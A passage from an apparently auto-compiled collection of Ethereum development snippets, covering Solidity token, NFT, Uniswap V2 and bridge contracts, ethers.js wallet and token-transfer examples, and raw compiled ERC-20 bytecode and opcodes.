>=0.7.3;\n\n// Defines a contract named `HelloWorld`.\n// A contract is a collection of functions and data (its state). Once deployed, a contract resides at a specific address on the Ethereum blockchain. Learn more: https://solidity.readthedocs.io/en/v0.5.10/structure-of-a-contract.html\ncontract HelloWorld {\n\n   //Emitted when update function is called\n   //Smart contract events are a way for your contract to communicate that something happened on the blockchain to your app front-end, which can be 'listening' for certain events and take action when they happen.\n   event UpdatedMessages(string oldStr, string newStr);\n\n   // Declares a state variable `message` of type `string`.\n   // State variables are variables whose values are permanently stored in contract storage. The keyword `public` makes variables accessible from outside a contract and creates a function that other contracts or clients can call to access the value.\n   string public message;\n\n   // Similar to many class-based object-oriented languages, a constructor is a special function that is only executed upon contract creation.\n   // Constructors are used to initialize the contract's data. Learn more:https://solidity.readthedocs.io/en/v0.5.10/contracts.html#constructors\n   constructor(string memory initMessage) {\n\n      // Accepts a string argument `initMessage` and sets the value into the contract's `message` storage variable).\n      message = initMessage;\n   }\n\n   // A public function that accepts a string argument and updates the `message` storage variable.\n   function update(string memory newMessage) public {\n      string memory oldMsg = message;\n      message = newMessage;\n      emit UpdatedMessages(oldMsg, newMessage);\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an ERC-721 NFT Smart Contract with Solidity\nDESCRIPTION: Implementation of an ERC-721 non-fungible token contract using OpenZeppelin libraries. The contract includes functionality to mint NFTs with custom metadata URIs and implements ownership controls.\n\nLANGUAGE: solidity\nCODE:\n```\n//Contract based on [https://docs.openzeppelin.com/contracts/3.x/erc721](https://docs.openzeppelin.com/contracts/3.x/erc721)\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/utils/Counters.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol\";\n\ncontract MyNFT is ERC721URIStorage, Ownable {\n    using Counters for Counters.Counter;\n    Counters.Counter private _tokenIds;\n\n    constructor() ERC721(\"MyNFT\", \"NFT\") {}\n\n    function mintNFT(address recipient, string memory tokenURI)\n        public onlyOwner\n        returns (uint256)\n    {\n        _tokenIds.increment();\n\n        uint256 newItemId = _tokenIds.current();\n        _mint(recipient, newItemId);\n        _setTokenURI(newItemId, tokenURI);\n\n        return newItemId;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing allowance Function in ERC-20\nDESCRIPTION: The allowance function is part of the ERC-20 delegation mechanism. It allows checking how many tokens a spender is allowed to spend on behalf of an owner. This is a view function that doesn't modify state and returns a uint256.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n```\n\n----------------------------------------\n\nTITLE: Calculating Added Token Amounts in Uniswap V2\nDESCRIPTION: Calculates how much of each token has been added to the pool by comparing current balances with previous reserves. This determines the amount of new liquidity to mint.\n\nLANGUAGE: solidity\nCODE:\n```\nuint balance0 = IERC20(token0).balanceOf(address(this));\nuint balance1 = IERC20(token1).balanceOf(address(this));\nuint amount0 = balance0.sub(_reserve0);\nuint amount1 = balance1.sub(_reserve1);\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Contract Implementation in Solidity\nDESCRIPTION: A complete ERC20 token contract implementation with standard functions for transfers, approvals, and balance management. The contract initializes with the name 'Basic' and symbol 'BSC', and includes 18 decimal places. It uses SafeMath for overflow protection.\n\nLANGUAGE: solidity\nCODE:\n```\n60806040523480156200001157600080fd5b506040516200153938038062001539833981810160405260208110156200003757600080fd5b81019080805190602001909291905050506040518060400160405280600581526020017f42617369630000000000000000000000000000000000000000000000000000008152506040518060400160405280600381526020017f42534300000000000000000000000000000000000000000000000000000000008152508160039080519060200190620000cc92919062000389565b508060049080519060200190620000e592919062000389565b506012600560006101000a81548160ff021916908360ff16021790555050506200011633826200011d60201b60201c565b5062000438565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415620001c1576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601f8152602001807f45524332303a206d696e7420746f20746865207a65726f20616464726573730081525060200191505060405180910390fd5b620001d560008383620002fb60201b60201c565b620001f1816002546200030060201b62000f2d1790919060201c565b6002819055506200024f816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546200030060201b62000f2d1790919060201c565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a35050565b505050565b6000808284019050838110156200037f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f10620003cc57805160ff1916838001178555620003fd565b82800160010185558215620003fd579182015b82811115620003fc578251825591602001919060010190620003df565b5b5090506200040c919062000410565b5090565b6200043591905b808211156200043157600081600090555060010162000417565b5090565b90565b6110f180620004486000396000f3fe608060405234801561001057600080fd5b50600436106100a95760003560e01c80633950935111610071578063395093511461025f57806370a08231146102c557806395d89b411461031d578063a457c2d7146103a0578063a9059cbb14610406578063dd62ed3e1461046c576100a9565b806306fdde03146100ae578063095ea7b31461013157806318160ddd1461019757806323b872dd146101b5578063313ce5671461023b575b600080fd5b6100b66104e4565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100f65780820151818401526020810190506100db565b50505050905090810190601f1680156101235780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61017d6004803603604081101561014757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610586565b604051808215151515815260200191505060405180910390f35b61019f6105a4565b6040518082815260200191505060405180910390f35b610221600480360360608110156101cb57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506105ae565b604051808215151515815260200191505060405180910390f35b610243610687565b604051808260ff1660ff16815260200191505060405180910390f35b6102ab6004803603604081101561027557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061069e565b604051808215151515815260200191505060405180910390f35b610307600480360360208110156102db57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610751565b6040518082815260200191505060405180910390f35b610325610799565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561036557808201518184015260208101905061034a565b50505050905090810190601f1680156103925780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6103ec600480360360408110156103b657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061083b565b604051808215151515815260200191505060405180910390f35b6104526004803603604081101561041c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610908565b604051808215151515815260200191505060405180910390f35b6104ce6004803603604081101561048257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610926565b6040518082815260200191505060405180910390f35b606060038054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561057c5780601f106105515761010080835404028352916020019161057c565b820191906000526020600020905b81548152906001019060200180831161055f57829003601f168201915b5050505050905090565b600061059a6105936109ad565b84846109b5565b6001905092915050565b6000600254905090565b60006105bb848484610bac565b61067c846105c76109ad565b6106778560405180606001604052806028815260200161102660289139600160008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600061062d6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b600190509392505050565b6000600560009054906101000a900460ff16905090565b60006107476106ab6109ad565b8461074285600160006106bc6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6109b5565b6001905092915050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b606060048054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156108315780601f1061080657610100808354040283529160200191610831565b820191906000526020600020905b81548152906001019060200180831161081457829003601f168201915b5050505050905090565b60006108fe6108486109ad565b846108f98560405180606001604052806025815260200161109760259139600160006108726109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b6001905092915050565b600061091c6109156109ad565b8484610bac565b6001905092915050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610a3b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001806110736024913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610ac1576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180610fde6022913960400191505060405180910390fd5b80600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610c32576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602581526020018061104e6025913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610cb8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526023815260200180610fbb6023913960400191505060405180910390fd5b610cc3838383610fb5565b610d2e81604051806060016040528060268152602001611000602691396000808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610dc1816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b6000838311158290610f1a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b83811015610edf578082015181840152602081019050610ec4565b50505050905090810190601f168015610f0c5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b600080828401905\n```\n\n----------------------------------------\n\nTITLE: Complete Token Transfer Implementation Function\nDESCRIPTION: JavaScript function for sending both ERC-20 tokens and Ether. It handles contract interactions for token transfers and direct transfers for Ether, with dynamic gas pricing and error handling.\n\nLANGUAGE: javascript\nCODE:\n```\nfunction send_token(\n  contract_address,\n  send_token_amount,\n  to_address,\n  send_account,\n  private_key\n) {\n  let wallet = new ethers.Wallet(private_key)\n  let walletSigner = wallet.connect(window.ethersProvider)\n\n  window.ethersProvider.getGasPrice().then((currentGasPrice) => {\n    let gas_price = ethers.utils.hexlify(parseInt(currentGasPrice))\n    console.log(`gas_price: ${gas_price}`)\n\n    if (contract_address) {\n      // general token send\n      let contract = new ethers.Contract(\n        contract_address,\n        send_abi,\n        walletSigner\n      )\n\n      // How many tokens?\n      let numberOfTokens = ethers.utils.parseUnits(send_token_amount, 18)\n      console.log(`numberOfTokens: ${numberOfTokens}`)\n\n      // Send tokens\n      contract.transfer(to_address, numberOfTokens).then((transferResult) => {\n        console.dir(transferResult)\n        alert(\"sent token\")\n      })\n    } // ether send\n    else {\n      const tx = {\n        from: send_account,\n        to: to_address,\n        value: ethers.utils.parseEther(send_token_amount),\n        nonce: window.ethersProvider.getTransactionCount(\n          send_account,\n          \"latest\"\n        ),\n        gasLimit: ethers.utils.hexlify(gas_limit), // 100000\n        gasPrice: gas_price,\n      }\n      console.dir(tx)\n      try {\n        walletSigner.sendTransaction(tx).then((transaction) => {\n          console.dir(transaction)\n          alert(\"Send finished!\")\n        })\n      } catch (error) {\n        alert(\"failed to send!!\")\n      }\n    }\n  })\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing connectWalletPressed Function in React Component\nDESCRIPTION: This function handles the wallet connection button press in the React UI. It calls the connectWallet function from the interact.js file and updates the component state with the connection status and wallet address.\n\nLANGUAGE: javascript\nCODE:\n```\n// HelloWorld.js\n\nconst connectWalletPressed = async () => {\n  const walletResponse = await connectWallet()\n  setStatus(walletResponse.status)\n  setWallet(walletResponse.address)\n}\n```\n\n----------------------------------------\n\nTITLE: Validating Transaction Deadlines in Solidity\nDESCRIPTION: Ensures that permit transactions can't be processed after their specified deadline by comparing against the current block timestamp. This prevents delayed transactions from being executed when they're no longer intended.\n\nLANGUAGE: solidity\nCODE:\n```\n        require(deadline >= block.timestamp, 'UniswapV2: EXPIRED');\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC20 approve function in Solidity\nDESCRIPTION: The approve function allows a token holder to set an allowance for another address to spend tokens on their behalf. It calls the internal _approve function and always returns true on success or reverts on failure.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev See {IERC20-approve}.\n *\n * Requirements:\n *\n * - `spender` cannot be the zero address.\n */\nfunction approve(address spender, uint256 amount) public virtual override returns (bool) {\n    _approve(_msgSender(), spender, amount);\n    return true;\n}\n```\n\n----------------------------------------\n\nTITLE: Vulnerable Smart Contract with Conditional Revert\nDESCRIPTION: A Solidity smart contract function that contains two possible execution paths based on a condition. This is used to demonstrate how dynamic symbolic execution works by analyzing path predicates.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction f(uint a){\n\n  if (a == 65) {\n      // A bug is present\n  }\n\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Cumulative Prices for TWAP Oracle in Uniswap V2 (Solidity)\nDESCRIPTION: This code updates price accumulators by adding the current exchange rate multiplied by elapsed time. These accumulators enable time-weighted average price (TWAP) calculations between any two points in time by calculating the difference in accumulator values divided by elapsed time.\n\nLANGUAGE: solidity\nCODE:\n```\n            // * never overflows, and + overflow is desired\n            price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;\n            price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;\n        }\n```\n\n----------------------------------------\n\nTITLE: Implementing Token Swap Function in Uniswap V2 Pair Contract\nDESCRIPTION: The swap function handles token exchanges between pairs with safety checks. It validates output amounts, verifies sufficient liquidity, performs transfers, and ensures the constant product formula (k = reserve0 * reserve1) is maintained while accounting for the 0.3% fee.\n\nLANGUAGE: solidity\nCODE:\n```\n    // this low-level function should be called from a contract which performs important safety checks\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        require(amount0Out > 0 || amount1Out > 0, 'UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT');\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'UniswapV2: INSUFFICIENT_LIQUIDITY');\n\n        uint balance0;\n        uint balance1;\n        { // scope for _token{0,1}, avoids stack too deep errors\n```\n\nLANGUAGE: solidity\nCODE:\n```\n            address _token0 = token0;\n            address _token1 = token1;\n            require(to != _token0 && to != _token1, 'UniswapV2: INVALID_TO');\n            if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n            if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n```\n\nLANGUAGE: solidity\nCODE:\n```\n            if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);\n```\n\nLANGUAGE: solidity\nCODE:\n```\n            balance0 = IERC20(_token0).balanceOf(address(this));\n            balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n        require(amount0In > 0 || amount1In > 0, 'UniswapV2: INSUFFICIENT_INPUT_AMOUNT');\n        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n            uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));\n            uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));\n            require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UniswapV2: K');\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC20 Token Transfer Function in Solidity\nDESCRIPTION: This function allows users to transfer tokens from their account to another address. It returns a boolean value which is always true if the function executes successfully, otherwise it reverts the transaction if there are insufficient tokens or other errors.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `recipient` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n```\n\n----------------------------------------\n\nTITLE: Wallet Functionality with Ethers.js\nDESCRIPTION: This extensive example demonstrates wallet functionality using Ethers.js, including wallet creation from mnemonics or private keys, address retrieval, accessing cryptographic components, signing messages and transactions, connecting to providers, and sending ether.\n\nLANGUAGE: javascript\nCODE:\n```\n// Create a wallet instance from a mnemonic...\nmnemonic =\n  \"announce room limb pattern dry unit scale effort smooth jazz weasel alcohol\"\nwalletMnemonic = Wallet.fromPhrase(mnemonic)\n\n// ...or from a private key\nwalletPrivateKey = new Wallet(walletMnemonic.privateKey)\n\nwalletMnemonic.address === walletPrivateKey.address\n// true\n\n// The address as a Promise per the Signer API\nwalletMnemonic.getAddress()\n// { Promise: '0x71CB05EE1b1F506fF321Da3dac38f25c0c9ce6E1' }\n\n// A Wallet address is also available synchronously\nwalletMnemonic.address\n// '0x71CB05EE1b1F506fF321Da3dac38f25c0c9ce6E1'\n\n// The internal cryptographic components\nwalletMnemonic.privateKey\n// '0x1da6847600b0ee25e9ad9a52abbd786dd2502fa4005dd5af9310b7cc7a3b25db'\nwalletMnemonic.publicKey\n// '0x04b9e72dfd423bcf95b3801ac93f4392be5ff22143f9980eb78b3a860c4843bfd04829ae61cdba4b3b1978ac5fc64f5cc2f4350e35a108a9c9a92a81200a60cd64'\n\n// The wallet mnemonic\nwalletMnemonic.mnemonic\n// {\n//   locale: 'en',\n//   path: 'm/44\\''/60\\''/0\\''/0/0',\n//   phrase: 'announce room limb pattern dry unit scale effort smooth jazz weasel alcohol'\n// }\n\n// Note: A wallet created with a private key does not\n//       have a mnemonic (the derivation prevents it)\nwalletPrivateKey.mnemonic\n// null\n\n// Signing a message\nwalletMnemonic.signMessage(\"Hello World\")\n// { Promise: '0x14280e5885a19f60e536de50097e96e3738c7acae4e9e62d67272d794b8127d31c03d9cd59781d4ee31fb4e1b893bd9b020ec67dfa65cfb51e2bdadbb1de26d91c' }\n\ntx = {\n  to: \"0x8ba1f109551bD432803012645Ac136ddd64DBA72\",\n  value: utils.parseEther(\"1.0\"),\n}\n\n// Signing a transaction\nwalletMnemonic.signTransaction(tx)\n// { Promise: '0xf865808080948ba1f109551bd432803012645ac136ddd64dba72880de0b6b3a7640000801ca0918e294306d177ab7bd664f5e141436563854ebe0a3e523b9690b4922bbb52b8a01181612cec9c431c4257a79b8c9f0c980a2c49bb5a0e6ac52949163eeb565dfc' }\n\n// The connect method returns a new instance of the\n// Wallet connected to a provider\nwallet = walletMnemonic.connect(provider)\n\n// Querying the network\nwallet.getBalance()\n// { Promise: { BigNumber: \"42\" } }\nwallet.getTransactionCount()\n// { Promise: 0 }\n\n// Sending ether\nwallet.sendTransaction(tx)\n```\n\n----------------------------------------\n\nTITLE: Initiating ERC-20 Token Deposit from L1 to L2 in Ethereum Bridge\nDESCRIPTION: This internal function handles the logic for depositing ERC-20 tokens from L1 to L2. It transfers tokens from the sender to the bridge contract, constructs a message to call finalizeDeposit on L2, sends the cross-domain message, updates the deposits tracking, and emits an event.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _initiateERC20Deposit(\n    address _l1Token,\n    address _l2Token,\n    address _from,\n    address _to,\n    uint256 _amount,\n    uint32 _l2Gas,\n    bytes calldata _data\n) internal {\n    // When a deposit is initiated on L1, the L1 Bridge transfers the funds to itself for future\n    // withdrawals. safeTransferFrom also checks if the contract has code, so this will fail if\n    // _from is an EOA or address(0).\n    // slither-disable-next-line reentrancy-events, reentrancy-benign\n    IERC20(_l1Token).safeTransferFrom(_from, address(this), _amount);\n    \n    // Construct calldata for _l2Token.finalizeDeposit(_to, _amount)\n    bytes memory message = abi.encodeWithSelector(\n        IL2ERC20Bridge.finalizeDeposit.selector,\n        _l1Token,\n        _l2Token,\n        _from,\n        _to,\n        _amount,\n        _data\n    );\n    \n    // Send calldata into L2\n    // slither-disable-next-line reentrancy-events, reentrancy-benign\n    sendCrossDomainMessage(l2TokenBridge, _l2Gas, message);\n    \n    // slither-disable-next-line reentrancy-benign\n    deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] + _amount;\n    \n    // slither-disable-next-line reentrancy-events\n    emit ERC20DepositInitiated(_l1Token, _l2Token, _from, _to, _amount, _data);\n}\n```\n\n----------------------------------------\n\nTITLE: Loading Ethereum Smart Contract with Web3 in NFT Minter\nDESCRIPTION: Initializes the smart contract using the Alchemy Web3 API and stores it in the window.contract global variable. This code is part of the mintNFT function used for interacting with the deployed NFT contract.\n\nLANGUAGE: javascript\nCODE:\n```\nwindow.contract = await new web3.eth.Contract(contractABI, contractAddress)\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Implementation in Solidity\nDESCRIPTION: Implementation of an ERC20 token contract with standard functions including transfer, approve, transferFrom, and balanceOf. The token is named 'Basic' with symbol 'BSC' and includes SafeMath functionality for preventing arithmetic overflow issues.\n\nLANGUAGE: bytecode\nCODE:\n```\n083811015610fab576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b50505056fe45524332303a207472616e7366657220746f20746865207a65726f206164647265737345524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e636545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f206164647265737345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa264697066735822122081c840f087cef92feccb03fadc678b2708c331896ec5432b5d4c675f27b6d3e664736f6c63430006020033\n```\n\nLANGUAGE: opcodes\nCODE:\n```\nPUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0x1539 CODESIZE SUB DUP1 PUSH3 0x1539 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH3 0x37 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x5 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4261736963000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4253430000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP2 PUSH1 0x3 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0xCC SWAP3 SWAP2 SWAP1 PUSH3 0x389 JUMP JUMPDEST POP DUP1 PUSH1 0x4 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0xE5 SWAP3 SWAP2 SWAP1 PUSH3 0x389 JUMP JUMPDEST POP PUSH1 0x12 PUSH1 0x5 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 PUSH1 0xFF AND MUL OR SWAP1 SSTORE POP POP POP PUSH3 0x116 CALLER DUP3 PUSH3 0x11D PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST POP PUSH3 0x438 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH3 0x1C1 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1F DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x45524332303A206D696E7420746F20746865207A65726F206164647265737300 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH3 0x1D5 PUSH1 0x0 DUP4 DUP4 PUSH3 0x2FB PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0x1F1 DUP2 PUSH1 0x2 SLOAD PUSH3 0x300 PUSH1 0x20 SHL PUSH3 0xF2D OR SWAP1 SWAP2 SWAP1 PUSH1 0x20 SHR JUMP JUMPDEST PUSH1 0x2 DUP2 SWAP1 SSTORE POP PUSH3 0x24F DUP2 PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH3 0x300 PUSH1 0x20 SHL PUSH3 0xF2D OR SWAP1 SWAP2 SWAP1 PUSH1 0x20 SHR JUMP JUMPDEST PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH3 0x37F JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 